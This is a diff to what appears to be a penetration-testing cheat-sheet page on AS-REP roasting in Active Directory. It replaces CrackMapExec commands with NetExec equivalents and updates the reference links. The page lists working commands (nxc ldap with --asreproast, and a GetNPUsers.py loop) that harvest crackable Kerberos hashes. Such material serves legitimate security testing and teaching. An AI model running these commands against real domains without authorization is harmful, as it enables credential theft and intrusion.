@@ -57,27 +57,27 @@ for i in $(cat USER_FILE); do GetNPUsers.py "DOMAIN/$i" -no-pass; done
 
 ```
 
-**Method 3:** CrackMapExec, single user
+**Method 3:** NetExec, single user
 
 ```bash
 
-cme ldap DC_IP -u 'USER_NAME' -p '' --asreproast OUT_FILE
+nxc ldap DC_IP -u 'USER_NAME' -p '' --asreproast OUT_FILE
 
 ```
 
-**Method 4:** CrackMapExec, with a user list
+**Method 4:** NetExec, with a user list
 
 ```bash
 
-cme ldap DC_IP -u 'USER_FILE' -p '' --asreproast OUT_FILE
+nxc ldap DC_IP -u 'USER_FILE' -p '' --asreproast OUT_FILE
 
 ```
 
-**Method 5:** CrackMapExec, all users at once (requires valid credentials)
+**Method 5:** NetExec, all users at once (requires valid credentials)
 
 ```bash
 
-cme ldap DC_IP -u 'USER_NAME' -p 'USER_PASS' --asreproast OUT_FILE
+nxc ldap DC_IP -u 'USER_NAME' -p 'USER_PASS' --asreproast OUT_FILE
 
 ```
 
@@ -88,6 +88,6 @@ See [Windows Password Cracking](../Credential%20Dumping/Windows%20Password%20Cra
 ## References
 
 - impacket - https://github.com/fortra/impacket
-- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
-- HackTricks - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
+- NetExec - https://github.com/Pennyw0rth/NetExec
+- HackTricks - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html
 - Hashcat example hashes - https://hashcat.net/wiki/doku.php?id=example_hashes
